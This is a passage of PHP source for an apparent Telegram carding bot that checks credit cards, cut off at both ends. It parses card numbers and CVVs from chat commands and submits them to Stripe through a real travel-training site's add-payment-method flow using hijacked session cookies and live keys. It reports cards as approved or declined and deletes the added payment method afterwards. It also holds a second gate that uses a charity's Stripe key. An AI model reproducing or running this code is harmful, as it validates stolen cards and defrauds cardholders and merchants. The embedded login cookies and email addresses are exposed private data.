  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.thetravelinstitute.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
// Extraer nonce
$patron_nonce = '/"createAndConfirmSetupIntentNonce":"([^"]*)"/';
preg_match($patron_nonce, $response, $matches_nonce);
$nonce = $matches_nonce[1];
curl_close($curl);



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&pasted_fields=number&payment_user_agent=stripe.js%2Fa3221739cb%3B+stripe-js-v3%2Fa3221739cb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.thetravelinstitute.com&time_on_page=43855&client_attribution_metadata%5Bclient_session_id%5D=d65d0026-84e4-4fec-83f1-a3244cc849e5&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=aa647898-0f7b-4647-a052-33a1d2f18d9464e5e8&muid=aa379a42-e19a-4c90-9052-16328908a242d00773&sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoianlGTXJ1c0txTnRkMXJXSEhqMC9MYUltZG9IaXZqM2RDeFVSWXhpTjFmMzRxc0JCMUlteTVUdVg0a1VZbWI5UDg1MGtUemIxKzQ2WThyZWg5aUl6TjhFSWJrRGVNTTlXT2JmT1VseklsYUtRUWRNRjdoVXVadHN4SnNRTWJ5U1B1cHFsN0ExQXZaYmpHbk0rL3RYelhMNnRaT0pTR1ZXNUF1RjVLMXRCd0dncUFNTjI0T1JoL1JNUjlQdjhrNmc4TTBOaW5VNE5ERmNwempZbExaODJXSlNBMWJBZWd5MFdaTXBBQWgxeEhLcDl2NkJEcllhcUtYbENoemVJUFNPeHg3L3djV0JMei9OWEhTSEtYbXZVUDVuRkhXNko5UFg4cjZ2MFAxblJHMElZSTl0aDBuSzVUcTdTTnJjYmNsRmZoWUZUZGhtY2pHQ24vM1pZa2xxblI5TTM1MXFDVldOTjJCdWJqcGVONHBSQXlQOWRrS1BYdXhNeDE0djRiSzI1R0tpcXp0Y0lmL25UNkw0bnNpUjZWbk1GdGdqY2VmUFZvd1QvMGdyMUs4akNHc1c4dy96bTlHcm9pZlAwWm1UaERvWjJaZ2ZiNEtpQ0ZaUlp2Vlk0VVZJS2w3YnRucitxNmNOSE1mbENIYm9qUldlRXY5TXh3ekFKM3NXMjB3UWQrZXNqNE9VeGJBdGZPZTFydVF1T2VSV0RLK2lnTU90Yk9jTXRFYTdScDBxeTB0ZTZ6VzFtb0tUUkROQ3FUYVRub0Q5QVZxTDMxYkFYa01HKzJ1azYxdlltWWp3UjQ5eVlFdmh3ZEo5RWlEMUdpc2hPaHFJZnpIUmxicXhEUXF3N2hKeUc5a1Y5dXVBWFJjTDJIWTNWS3JHRzF3em1kTVBvbXJrT3IyNGh3WUVGYUxHdDlLY0dwMnMwQmpnM09pSVlOenFRcGhBNjFJREoza2Nha09MTUpJcVE1eUdza2xMdDNYWU5SWVEyYmtma1huZDZtRTIxQjlUMTRvSTEwWnh6clJDVGtjM3crT1Y4NXhrUGtGcjVhU2lWT3NJaFU2QUtSMy82b01FL2FOakNpU0ZmYkxMbDJDUmgxelIrYVRsa3prR2RJaVg4b1Jxb2I2WU9DSS9ha2NtMGU3S3FnbWJBckZHRGRSSjZWUUFrbHBsNlAxWWRqeG41eHN4bVR3Ui96amxDVXdYTk1QczJEcnFRc3lsRE10dWsyUUhhbGR0MEUrcTJaQzFuckZYMXJJWVVDWExoUHFoc1g2NzVJamNWb29mbGErYUdqVkt3SzBNT3dnYzVyYVhmQVB5a1gvemxsWU5tQzRFTjZRaG9VYWtUWjNMUzNTVmFZYnFjcFJnbUlrekhTbE82ZStyZjZsaSs5Z000SldndDNBK1RuVytHdS84RmdNKzJKcFZ2SEJlYTdwOFIwbUdaS1ozV3VLMmZ4S1pPOE0rT0ZGRlJES3VObmM5SWRaVjdUMzV0UmQyblpPYVhnL09wYzcxS2gwbUVYU1FWdGx4T3dzQnJHOFRaN0lmcjBQMWlMUVU4N0MwSVA3NjZzZEdNRWt0WFZqNnJVUGt6U0hTT2ZTZnhGK1dPa2tWTjN5MG82T3VRVk9oZHpRT3NqNEtHcWhhNkZCSFdYa1RRVWNub2hPMDBGSzNhWmFHVnBJRGdjNWRia3kzWXZvMmJmajhTTGlLdHR5U0tCaEZoLzVWVk9IQWJXSUhOUE14U3lVNkxiYzRaQWRxMGdtKy9zdlZxQ1NHWjdFNS9ZRWtnNldUVFA1UmRMU0xqaERld2hqaFFDSzhKRlBnVnJOcGViZ25wSjRPenBuS1g1K3dmVlNHRTFtWjEwa0VDR09LdUdHZlU0ZGh1ME1zdHR1WFdzTU5CcW9oUDBBbHJIZmpINmhTSFJPYS9uV3kxeER4VlNxWTRqdS9haXR0dFdCdmJuSWhBTURNb3hoUTZjYnRvSlc4NjNGajFFVmhVdjQyQnQ2a0ZReHB6MnJ1UHpTVHQxS21HeHdOQjJoMnJ5M3JjTmo5alRqSFZwZDZud2VCYk52R0xrUjVzVEorZ1kwYm1lOUkxN0lEY2I3RjhmZDlLakZNZXJMQmNVaW16VDVNOElhalNyMWkxZFdxVk8zQ216SFhBNWdsRTJybnJZY0JCNEJOWGVOSUZJL0FBcWZ5blFpaGhuMDZyZjFmUU9hUTFFaUE1ZzBMWWJSZXhRNzBSc0ZjdWlLZXBkcElDOEpBSDdjQ1pMeW11NXQ5YksvWXlka3dWZ1lrK2ZwNXlrZU1hVDA4bzJPQ0N5OE9DVTBiZjVzdHVweXR5ci9Ob3RWMjBPVHVoSW1NdnlhZVdUYkwyNEVDMjlZQ2hxeXhOU0FZM0pVSkZTT0hQRTcwUEZEbnZkM2F2aUJrMXpiRFQrQVlQTlBZaVBtaWNGbjZaaVJsWnR3eEczdjFvSFpjZUw5eVdtZ2I5Vkd4ZmR6YWVYRFNHdmdrOUJoYVhhMmhxMDMxSkVvQTY2RFBVMDhUaDYweTVNZ1FZMnd4UHZYS3RPTFJNT24vNVJCVlNsVGdjSVlPVkc1U1RKQ3ljeUFOMzhBRkJ2SGFnRTFNUjE5MTFjTWdIZmkrTFVaQkQzU2FEY3hhK0xqUjJxTGpFTlBPZ1E0TUo2NU1rS3NlaWRURlBHQzRrSTFBdkwrMzhTK2VxR09rWHlZSDBwTWdXNnNSbHlTL1F4TWg1dk95ZTNyWjdxRnRSdWoyd3p0TUJzeVBZdDZEelpPRDRHRjJiaDIzRUM4cTJvOWpubXQranhyQU82QWloeDdLRUJqakFPbHRVcnFvenZBPT0iLCJleHAiOjE3MzE3OTYxODEsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiZThhZGM2NCIsInBkIjowLCJjZGF0YSI6IklQZWowTkcyem5UNFZ2ZENDbEtQWHpkenFZb0J5cnFGNTlnbGpyOUFuNGJ6V3ZDQ0xudERHWmpKVFhITDJuM1lRR09oblpiODEra2dtcGNad3F5K3l0M1Q1V2JYVTJJOVZNRzA4cS9FeFNjTVFiVGNmR3JBdDI4QkZBNTBlUFR4NnZ4SUE0V1pEUnUvUWl3Q2YvVTJPZW1KN3cvdWc0SFFhRzhmNW11bzVXN3ptREYyT1JzM3B0dThvZ3d6d2Q1M1RpNHM1QWdvYTVETFFhNm4ifQ.KTZJIXxZUrKFOeJkr5o2EHvQuJH4DWPa7I26QT_qZ-k',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.6',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.thetravelinstitute.com',
    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!";



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.thetravelinstitute.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";




if (empty($respo)) {
        $respo = $response;
}

if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}


elseif((strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)){
$lista = substr($message, 4);
//$i     = explode("|", $lista);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$ano1  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
$ma = "$mes+%2F+$ano";

$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}                                                                                                    
if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ch cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ch cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ch cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
	die();
}
                                                                                                     
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
	sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
	//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  //  CURLOPT_POSTFIELDS => 'type=card&billing_details%5Baddress%5D%5Bpostal_code%5D=37435&billing_details%5Baddress%5D%5Bcity%5D=Pearland&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D=543+w+belt+line+rd&billing_details%5Bemail%5D=poichad70%40rhyta.com&billing_details%5Bname%5D=Rigo++Perez&card%5Bnumber%5D=4169161444795073&card%5Bcvc%5D=588&card%5Bexp_month%5D=03&card%5Bexp_year%5D=29&guid=48a8dab2-9ea1-449d-8977-4278ae5f52b982b3ec&muid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f&sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=46867&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
  CURLOPT_POSTFIELDS => 'type=card&billing_details[address][postal_code]=37435&billing_details[address][city]=Pearland&billing_details[address][country]=US&billing_details[address][line1]=543+w+belt+line+rd&billing_details[email]=poichad70%40rhyta.com&billing_details[name]=Rigo++Perez&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=48a8dab2-9ea1-449d-8977-4278ae5f52b982b3ec&muid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f&sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=46867&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
  CURLOPT_HTTPHEADER => [
